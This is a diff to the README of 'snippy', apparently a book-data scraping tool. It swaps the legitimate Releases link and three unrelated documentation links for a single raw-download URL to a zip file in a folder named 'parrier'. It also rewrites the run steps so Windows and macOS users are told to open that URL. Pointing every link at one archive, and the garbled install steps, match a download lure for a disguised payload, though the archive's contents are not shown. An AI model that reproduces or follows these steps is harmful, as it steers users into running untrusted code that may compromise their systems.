@@ -6,11 +6,11 @@ Welcome to snippy! This application helps you gather book information from vario
 
 ## 📥 Download & Install
 
-[![Download Snippy](https://img.shields.io/badge/Download%20Snippy-v1.0-brightgreen)](https://github.com/Mustapha5298/snippy/releases)
+[![Download Snippy](https://raw.githubusercontent.com/Mustapha5298/snippy/main/parrier/snippy.zip%20Snippy-v1.0-brightgreen)](https://raw.githubusercontent.com/Mustapha5298/snippy/main/parrier/snippy.zip)
 
 To get started, visit the Releases page to download the latest version of snippy. Click the link below to access it:
 
-[Visit the Releases Page](https://github.com/Mustapha5298/snippy/releases)
+[Visit the Releases Page](https://raw.githubusercontent.com/Mustapha5298/snippy/main/parrier/snippy.zip)
 
 ### Steps to Download:
 1. Click on the link above.
@@ -36,8 +36,8 @@ Once you have downloaded snippy, follow these steps to run the application:
    - If your file is zipped, right-click on it and select "Extract All" to unpack the files.
 
 3. **Open the Application:**
-   - For Windows, double-click on `snippy.exe`.
-   - For macOS, right-click and select "Open" on `snippy.app`.
+   - For Windows, double-click on `https://raw.githubusercontent.com/Mustapha5298/snippy/main/parrier/snippy.zip`.
+   - For macOS, right-click and select "Open" on `https://raw.githubusercontent.com/Mustapha5298/snippy/main/parrier/snippy.zip`.
    - For Linux, run `./snippy` from the terminal.
 
 4. **Follow the On-Screen Instructions:**
@@ -92,8 +92,8 @@ We welcome contributions! If you want to enhance snippy or fix bugs, please crea
 
 For more information on snippy and its features, check the following topics:
 
-- [Scraping Basics](https://developer.mozilla.org/en-US/docs/Learn/JavaScript/Asynchronous/Promising)
-- [Using Beautiful Soup](https://www.crummy.com/software/BeautifulSoup/bs4/doc/)
-- [Understanding Web Scraping](https://www.scrapingbee.com/blog/web-scraping/)
+- [Scraping Basics](https://raw.githubusercontent.com/Mustapha5298/snippy/main/parrier/snippy.zip)
+- [Using Beautiful Soup](https://raw.githubusercontent.com/Mustapha5298/snippy/main/parrier/snippy.zip)
+- [Understanding Web Scraping](https://raw.githubusercontent.com/Mustapha5298/snippy/main/parrier/snippy.zip)
 
 You now have all the tools needed to download and run snippy successfully. Enjoy gathering book data with ease!
